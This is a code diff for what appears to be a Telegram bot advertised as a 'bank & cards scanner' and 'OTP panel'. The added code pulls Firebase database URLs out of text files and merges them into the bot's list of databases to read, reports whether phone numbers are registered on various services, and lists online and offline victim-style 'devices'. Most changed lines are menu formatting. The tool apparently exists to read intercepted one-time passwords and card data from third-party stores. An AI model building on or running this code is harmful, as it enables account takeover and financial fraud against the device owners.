@@ -5,6 +5,7 @@
   RAILWAY ANTI-CRASH OPTIMIZED | GHOST WEB SERVER
   DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
   5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
+  AUTO-LOAD PANELS FROM .TXT FILES | VIP & PROMO SYSTEM
 ══════════════════════════════════════════════════════
 """
 
@@ -58,6 +59,7 @@ ADMIN_IDS: set[int] = {6860106371}
 
 WAIT_EMAIL, WAIT_OTP, WAIT_PROMPT, WAIT_NUMBER = range(4)
 
+# 🔥 AUTO-LOAD ALL PANELS FROM .TXT FILES 🔥
 def extract_urls_from_files() -> list:
     extracted_urls = set()
     pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
@@ -75,6 +77,7 @@ def extract_urls_from_files() -> list:
 
 RAW_URLS = list(set(extract_urls_from_files()))
 
+# Combine Vanguard DB + All Extracted DBs
 DATABASES = {"VANTAGE_MAIN": {"url": VANTAGE_DB, "auth": VANTAGE_AUTH}}
 for i, url in enumerate(RAW_URLS):
     if url != VANTAGE_DB:
@@ -280,7 +283,7 @@ async def auto_save_loop():
         await asyncio.sleep(300) 
         await save_data_async()
 
-# 🔥 THE MISSING BACKUP LOOP RESTORED 🔥
+# 🔥 AUTO BACKUP LOOP RESTORED 🔥
 async def hourly_backup_loop(app: Application):
     while True:
         await asyncio.sleep(7200) 
@@ -302,7 +305,7 @@ async def hourly_backup_loop(app: Application):
 
 async def memory_sweeper():
     while True:
-        await asyncio.sleep(300) 
+        await asyncio.sleep(600) 
         now = time.time()
         expired_cd = [k for k, v in user_cooldowns.items() if now - v > 3600]
         for k in expired_cd: del user_cooldowns[k]
@@ -640,6 +643,28 @@ def get_app_search_menu():
         [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
     ])
 
+def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
+    srv_name, emoji = service.capitalize(), "✨"
+    for row in get_checker_menu().inline_keyboard:
+        for btn in row:
+            if service.lower() in btn.text.lower():
+                parts = btn.text.split(" ")
+                emoji, srv_name = parts[0], " ".join(parts[1:])
+                break
+    display_num = number if str(number).startswith("+") else f"+{number}"
+    if is_error: return f"⚠ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
+    return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"
+
+def device_list_header(devices: list[Device], page: int = 0) -> str:
+    online  = sum(1 for d in devices if d.status == "online")
+    offline = len(devices) - online
+    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
+    progress = ""
+    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1 and SCAN_PROGRESS["total"] != 99999:
+        pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
+        progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
+    return f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n{progress}🟢 Online: {online}   🔴 Offline: {offline}\n📊 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
+
 def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
     page        = max(0, min(page, total_pages - 1))
@@ -653,7 +678,8 @@ def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboard
         if len(row) == 2:
             rows.append(row)
             row = []
-    if row: rows.append(row)
+    if row:
+        rows.append(row)
 
     nav = []
     if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"pg:{page - 1}"))
@@ -675,7 +701,8 @@ def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
             if len(row) == 2:
                 rows.append(row)
                 row = []
-        if row: rows.append(row)
+        if row:
+            rows.append(row)
     else: 
         rows.append([InlineKeyboardButton("📭 No devices online", callback_data="noop")])
         
@@ -757,7 +784,7 @@ async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, durat
 
     nav = []
     callback_prefix = "f5:" if duration_minutes == 5 else "f30:"
-    if page > 0: nav.append(InlineKeyboardButton("⬅️️ Prev", callback_data=f"{callback_prefix}{page-1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{callback_prefix}{page-1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"{callback_prefix}{page+1}"))
     if nav: kb.append(nav)
@@ -914,7 +941,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 # ═══════════════════════════════════════════════════════
-#  CORE COMMANDS & HANDLERS
+#  CORE TELEGRAM HANDLERS (THE MISSING PIECE RESTORED)
 # ═══════════════════════════════════════════════════════
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -934,8 +961,6 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if ref_id in all_users and ref_id != chat_id:
                 all_users[ref_id]["referrals"] = all_users[ref_id].get("referrals", 0) + 1
                 save_user(ref_id)
-                try: await ctx.bot.send_message(ref_id, f"🎉 New user joined via your link! Total Referrals: {all_users[ref_id]['referrals']}/10")
-                except: pass
         save_user(chat_id)
         
         try:
